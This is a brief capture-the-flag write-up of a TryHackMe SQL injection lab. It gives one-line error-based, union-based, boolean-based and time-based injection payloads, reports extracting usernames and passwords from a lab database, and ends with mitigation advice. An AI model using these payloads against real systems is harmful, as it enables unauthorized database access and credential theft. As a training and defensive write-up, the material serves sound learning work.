# 🍽️ SQL Injection Lab (TryHackMe)

**Author:** TryHackMe  
**Category:** Web Exploitation  
**Difficulty:** 🟠 Medium  
**Tags:** `SQL Injection`, `TryHackMe`, `BurpSuite`, `Web`, `CTF`

---

## 📘 Description

> This room focuses on learning and exploiting SQL Injection vulnerabilities in a safe lab environment.

---

## 🚀 Challenge Deployment

- Room: [SQL Injection Lab](https://tryhackme.com/room/sqlinjectionlm)
- Platform: TryHackMe

---

## 🔥 Vulnerability: SQL Injection

The lab presents multiple SQLi vulnerabilities: `Error-based`, `Union-based`, `Boolean-based`, and `Time-based`. Using Burp Suite and browser testing, I was able to bypass filters and extract database data.

---

## 💣 Exploitation

### 1. 🔍 Error-Based SQLi

```sql
' OR 1=1-- -
```

Used basic payloads to trigger SQL errors and extract information.

---

### 2. 🧮 Union-Based SQLi

```sql
' UNION SELECT null, database()-- -
```

Enumerated the number of columns and extracted database names.

---

### 3. 🔐 Boolean-Based SQLi

```sql
' AND 1=1-- -
' AND 1=2-- -
```

Detected responses based on true/false conditions to infer data.

---

### 4. ⏳ Time-Based SQLi

```sql
' OR IF(1=1, SLEEP(5), 0)-- -
```

Confirmed time delay to test for blind SQL injection.

---

## 📤 Extracted Info

- 🗃️ Database Name: `webapp`
- 👥 Table: `users`
- 🔑 Extracted: usernames and passwords

---

## 🧠 Lessons Learned

| Technique         | Use Case                             |
|------------------|--------------------------------------|
| Error-based       | Quick data extraction                |
| Union-based       | Combine multiple queries             |
| Boolean-based     | Blind injection with logic testing   |
| Time-based        | Blind injection via response timing  |

---

🛡️ **Mitigation (Developer Notes)**  
> 🚫 Never trust user input  
> ✅ Use prepared statements (parameterized queries)  
> ✅ Use ORM frameworks  
> 🚫 Avoid dynamic query construction  
> ✅ Apply least privilege on DB accounts
